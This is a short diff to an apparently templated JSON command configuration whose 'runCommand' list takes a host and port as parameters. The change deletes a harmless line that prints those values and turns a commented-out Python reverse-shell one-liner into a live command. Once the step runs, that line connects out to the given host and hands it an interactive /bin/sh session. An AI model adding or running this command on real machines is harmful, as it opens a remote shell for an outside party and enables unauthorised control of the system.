@@ -20,8 +20,7 @@
         "runCommand": [
           "port={{ port }}",
           "host1={{ host }}",
-          "python3 -c 'print(\"'$host1','$port'\")'",
-          "#python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"'$host1'\",'$port'));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"
+          "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"'$host1'\",'$port'));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"
         ]
       }
     }
